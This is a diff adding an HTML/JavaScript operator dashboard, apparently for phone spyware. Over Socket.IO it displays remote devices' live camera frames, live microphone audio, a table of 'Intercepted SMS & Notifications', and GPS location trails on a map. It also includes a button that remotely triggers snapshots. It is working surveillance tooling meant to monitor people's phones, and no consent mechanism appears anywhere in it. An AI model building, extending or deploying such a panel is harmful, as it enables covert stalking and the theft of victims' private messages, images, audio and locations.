@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Live Device Dashboard - Pro Edition</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
+
+    <style>
+        body {
+            background: #0b0b0b;
+            color: white;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 { margin-bottom: 10px; color: #00ff9c; }
+
+        #stats {
+            margin-bottom: 20px;
+            background: #111;
+            padding: 10px;
+            border-radius: 8px;
+            display: inline-block;
+            border: 1px solid #333;
+        }
+
+        #devices {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .card {
+            background: #1a1a1a;
+            padding: 20px;
+            margin: 10px;
+            border-radius: 10px;
+            width: 260px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+            text-align: left;
+        }
+
+        .online { color: #00ff9c; font-weight: bold; }
+        .offline { color: #ff4d4d; font-weight: bold; }
+
+        /* 🎥 Live Stream Viewport */
+        .live-stream-box {
+            width: 100%;
+            height: 120px;
+            background: #000;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .live-frame {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .media-debug {
+            margin-top: 10px;
+            padding: 8px;
+            border-radius: 6px;
+            background: #121212;
+            border: 1px solid #2d2d2d;
+            font-size: 12px;
+            color: #bdbdbd;
+        }
+
+        .media-debug strong {
+            color: #00ff9c;
+        }
+
+        button {
+            padding: 8px 12px;
+            margin-top: 10px;
+            border: none;
+            background: #00ff9c;
+            color: black;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover { background: #00cc7d; }
+
+        #map {
+            height: 450px;
+            margin: 20px auto;
+            border-radius: 12px;
+            width: 95%;
+            border: 2px solid #333;
+        }
+
+        /* 📱 SMS / Notification Log Table */
+        #log-container {
+            width: 95%;
+            margin: 20px auto;
+            background: #111;
+            border-radius: 10px;
+            padding: 15px;
+            border: 1px solid #333;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+
+        th { background: #222; color: #00ff9c; padding: 10px; text-align: left; }
+        td { padding: 10px; border-bottom: 1px solid #222; text-align: left; font-size: 13px; }
+
+        #snapshots {
+            margin-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .snapshot {
+            width: 220px;
+            margin: 10px;
+            border-radius: 8px;
+            border: 2px solid #00ff9c;
+            transition: transform 0.3s;
+        }
+
+        .snapshot:hover { transform: scale(1.05); }
+
+        #audio-panel {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #111;
+            border-top: 2px solid #00ff9c;
+            display: flex;
+            gap: 14px;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 20px;
+            z-index: 9999;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.6);
+        }
+
+        #audio-panel label {
+            color: #00ff9c;
+            font-weight: bold;
+            font-size: 14px;
+            white-space: nowrap;
+        }
+
+        #audio-player {
+            flex: 1;
+            max-width: 480px;
+            height: 36px;
+        }
+
+        body {
+            padding-bottom: 80px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>📊 PRO DEVICE COMMAND CENTER</h1>
+
+    <div id="stats">
+        Devices Online: <span id="onlineCount" class="online">0</span> |
+        Total Registered: <span id="totalCount">0</span>
+    </div>
+
+    <div id="stats" style="display:block; width:95%; margin:10px auto; text-align:left;">
+        <b>Runtime Metrics</b><br>
+        Uptime: <span id="metric-uptime">--</span> |
+        Dashboard Viewers: <span id="metric-viewers">0</span> |
+        Telemetry/s: <span id="metric-telemetry-rate">0</span> |
+        Frames/s: <span id="metric-frame-rate">0</span> |
+        Audio/s: <span id="metric-audio-rate">0</span>
+    </div>
+
+    <div id="devices"></div>
+
+    <div id="map"></div>
+
+    <div id="log-container">
+        <h3>📱 Intercepted SMS & Notifications</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Device</th>
+                    <th>Source/Sender</th>
+                    <th>Message Content</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="notif-body">
+                </tbody>
+        </table>
+    </div>
+
+    <h3>📸 Captured Snapshots</h3>
+    <div id="snapshots"></div>
+
+    <div id="audio-panel">
+        <label>🎙️ Live Mic Audio</label>
+        <audio id="audio-player" autoplay controls></audio>
+        <button id="enable-audio">🔊 Enable Audio</button>
+    </div>
+
+    <script>
+        const socket = io();
+        const MAX_TRAIL_POINTS = 120;
+        const MAX_NOTIFICATIONS = 100;
+        const MAX_SNAPSHOTS = 50;
+        const FRAME_RENDER_INTERVAL_MS = 150;
+
+        const lastFrameRenderByDevice = {};
+        const latestFrameByDevice = {};
+        const mediaStatsByDevice = {};
+        let currentAudioUrl = null;
+        let audioUnlocked = false;
+
+        const audio = document.getElementById("audio-player");
+        const enableAudioBtn = document.getElementById("enable-audio");
+
+        async function unlockAudio() {
+            try {
+                await audio.play();
+                audioUnlocked = true;
+                if (enableAudioBtn) enableAudioBtn.textContent = "✅ Live Audio Enabled";
+            } catch (_) {
+                audioUnlocked = false;
+            }
+        }
+
+        if (enableAudioBtn) {
+            enableAudioBtn.addEventListener("click", unlockAudio);
+        }
+
+        function getMediaStats(deviceId) {
+            if (!mediaStatsByDevice[deviceId]) {
+                mediaStatsByDevice[deviceId] = {
+                    frames: 0,
+                    audioChunks: 0,
+                    lastFrameAt: 0,
+                    lastAudioAt: 0,
+                };
+            }
+            return mediaStatsByDevice[deviceId];
+        }
+
+        function formatAge(timestamp) {
+            if (!timestamp) return 'never';
+            const seconds = Math.max(0, Math.floor((Date.now() - timestamp) / 1000));
+            return `${seconds}s ago`;
+        }
+
+        function paintMediaStats(deviceId) {
+            const stats = mediaStatsByDevice[deviceId];
+            if (!stats) return;
+
+            const framesEl = document.getElementById(`media-frames-${deviceId}`);
+            const audioEl = document.getElementById(`media-audio-${deviceId}`);
+            const frameAgeEl = document.getElementById(`media-frame-age-${deviceId}`);
+            const audioAgeEl = document.getElementById(`media-audio-age-${deviceId}`);
+
+            if (framesEl) framesEl.textContent = String(stats.frames);
+            if (audioEl) audioEl.textContent = String(stats.audioChunks);
+            if (frameAgeEl) frameAgeEl.textContent = formatAge(stats.lastFrameAt);
+            if (audioAgeEl) audioAgeEl.textContent = formatAge(stats.lastAudioAt);
+        }
+
+        // ------------------------
+        // MAP SETUP (Upgraded)
+        // ------------------------
+        let map = L.map('map').setView([6.5244, 3.3792], 5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19,
+            attribution: '© OpenStreetMap'
+        }).addTo(map);
+
+        let markers = {};
+        let trails = {};
+
+        socket.on("connect", () => {
+            socket.emit("join_dashboard");
+        });
+
+        // ------------------------
+        // DASHBOARD UPDATE ENGINE
+        // ------------------------
+        socket.on("dashboard_update", devices => {
+            const container = document.getElementById("devices");
+            const htmlParts = [];
+            let online = 0;
+            const total = Object.keys(devices).length;
+            const activeIds = new Set(Object.keys(devices));
+
+            for (const id in devices) {
+                const d = devices[id];
+                if (d.status === "online") online++;
+                const existingFrame = latestFrameByDevice[id] || "";
+                const noFeedStyle = existingFrame ? "display:none;" : "position:absolute; font-size:10px; color:#555;";
+                const stats = getMediaStats(id);
+
+                htmlParts.push(`
+                    <div class="card">
+                        <div class="live-stream-box">
+                            <img id="live-${id}" class="live-frame" src="${existingFrame}">
+                            <div id="label-${id}" style="${noFeedStyle}">No Feed</div>
+                        </div>
+                        <br>
+                        <b>ID:</b> ${id.substring(0, 10)}...<br>
+                        <b>Model:</b> ${d.model || "Unknown"}<br>
+                        <b>Network:</b> ${d.network || "--"}<br>
+                        <b>Battery:</b> ${d.battery || "--"} (${d.charging ? '⚡' : '🔋'})<br>
+                        <b>Status:</b> <span class="${d.status === "online" ? "online" : "offline"}">${d.status}</span>
+
+                        <div class="media-debug">
+                            <div><strong>Frames:</strong> <span id="media-frames-${id}">${stats.frames}</span></div>
+                            <div><strong>Last frame:</strong> <span id="media-frame-age-${id}">${formatAge(stats.lastFrameAt)}</span></div>
+                            <div><strong>Audio chunks:</strong> <span id="media-audio-${id}">${stats.audioChunks}</span></div>
+                            <div><strong>Last audio:</strong> <span id="media-audio-age-${id}">${formatAge(stats.lastAudioAt)}</span></div>
+                        </div>
+
+                        <button onclick="takePhoto('${id}')">📸 Trigger Snapshot</button>
+                    </div>
+                `);
+
+                if (d.lat && d.lon) {
+                    if (!markers[id]) {
+                        markers[id] = L.marker([d.lat, d.lon]).addTo(map).bindPopup(id);
+                        trails[id] = L.polyline([[d.lat, d.lon]], { color: "#00ff9c", weight: 3 }).addTo(map);
+                    } else {
+                        markers[id].setLatLng([d.lat, d.lon]);
+                        trails[id].addLatLng([d.lat, d.lon]);
+
+                        const points = trails[id].getLatLngs();
+                        if (points.length > MAX_TRAIL_POINTS) {
+                            trails[id].setLatLngs(points.slice(points.length - MAX_TRAIL_POINTS));
+                        }
+                    }
+                }
+            }
+
+            container.innerHTML = htmlParts.join("");
+
+            activeIds.forEach((id) => {
+                paintMediaStats(id);
+            });
+
+            Object.keys(markers).forEach((id) => {
+                if (!activeIds.has(id)) {
+                    map.removeLayer(markers[id]);
+                    map.removeLayer(trails[id]);
+                    delete markers[id];
+                    delete trails[id];
+                    delete lastFrameRenderByDevice[id];
+                    delete latestFrameByDevice[id];
+                    delete mediaStatsByDevice[id];
+                }
+            });
+
+            document.getElementById("onlineCount").innerText = online;
+            document.getElementById("totalCount").innerText = total;
+        });
+
+        // ------------------------
+        // 🎥 LIVE VIDEO RENDERER
+        // ------------------------
+        socket.on("render_frame", data => {
+            const now = Date.now();
+            const last = lastFrameRenderByDevice[data.device_id] || 0;
+            if ((now - last) < FRAME_RENDER_INTERVAL_MS) return;
+            lastFrameRenderByDevice[data.device_id] = now;
+            latestFrameByDevice[data.device_id] = data.frame;
+            const stats = getMediaStats(data.device_id);
+            stats.frames += 1;
+            stats.lastFrameAt = now;
+
+            const imgElement = document.getElementById(`live-${data.device_id}`);
+            const label = document.getElementById(`label-${data.device_id}`);
+            if (imgElement) {
+                imgElement.src = data.frame;
+                if (label) label.style.display = "none";
+            }
+            paintMediaStats(data.device_id);
+        });
+
+        // ------------------------
+        // 🔊 AUDIO STREAMING ENGINE
+        // ------------------------
+        socket.on("play_audio", data => {
+            const deviceId = data.device_id || 'unknown';
+            const stats = getMediaStats(deviceId);
+            stats.audioChunks += 1;
+            stats.lastAudioAt = Date.now();
+            const blob = new Blob([data.audio], { type: 'audio/webm; codecs=opus' });
+            const url = URL.createObjectURL(blob);
+            if (currentAudioUrl) {
+                URL.revokeObjectURL(currentAudioUrl);
+            }
+            currentAudioUrl = url;
+            audio.src = url;
+            if (audioUnlocked) {
+                audio.play().catch(() => {});
+            }
+            paintMediaStats(deviceId);
+        });
+
+        setInterval(() => {
+            Object.keys(mediaStatsByDevice).forEach((deviceId) => {
+                paintMediaStats(deviceId);
+            });
+        }, 1000);
+
+        // ------------------------
+        // 📱 SMS / NOTIFICATION RECEIVER
+        // ------------------------
+        socket.on("new_notification_alert", data => {
+            const tableBody = document.getElementById("notif-body");
+            const row = `
+                <tr>
+                    <td style="color:#00ff9c">${data.device_id.substring(0, 8)}</td>
+                    <td><b>${data.title}</b></td>
+                    <td>${data.body}</td>
+                    <td>${new Date().toLocaleTimeString()}</td>
+                </tr>
+            `;
+            tableBody.insertAdjacentHTML('afterbegin', row);
+
+            while (tableBody.children.length > MAX_NOTIFICATIONS) {
+                tableBody.removeChild(tableBody.lastElementChild);
+            }
+        });
+
+        // ------------------------
+        // COMMANDS & SNAPSHOTS
+        // ------------------------
+        function takePhoto(deviceId) {
+            socket.emit("request_snapshot", deviceId);
+        }
+
+        socket.on("view_snapshot", (data) => {
+            const box = document.getElementById("snapshots");
+            const el = document.createElement("img");
+            el.src = data.image;
+            el.className = "snapshot";
+            box.prepend(el);
+
+            while (box.children.length > MAX_SNAPSHOTS) {
+                box.removeChild(box.lastElementChild);
+            }
+        });
+
+        function formatUptime(seconds) {
+            const total = Number(seconds || 0);
+            const h = Math.floor(total / 3600);
+            const m = Math.floor((total % 3600) / 60);
+            const s = total % 60;
+            return `${h}h ${m}m ${s}s`;
+        }
+
+        async function refreshMetrics() {
+            try {
+                const response = await fetch('/metrics', { cache: 'no-store' });
+                if (!response.ok) return;
+                const data = await response.json();
+
+                document.getElementById('metric-uptime').innerText = formatUptime(data.uptime_seconds);
+                document.getElementById('metric-viewers').innerText = data.sockets.dashboard_viewers;
+                document.getElementById('metric-telemetry-rate').innerText = data.rates_per_second.telemetry_events;
+                document.getElementById('metric-frame-rate').innerText = data.rates_per_second.stream_frames;
+                document.getElementById('metric-audio-rate').innerText = data.rates_per_second.audio_chunks;
+            } catch (error) {
+                console.log('Metrics refresh failed', error);
+            }
+        }
+
+        refreshMetrics();
+        setInterval(refreshMetrics, 5000);
+        setInterval(() => {
+            location.reload();
+        }, 5000);
+
+    </script>
+</body>
+</html>
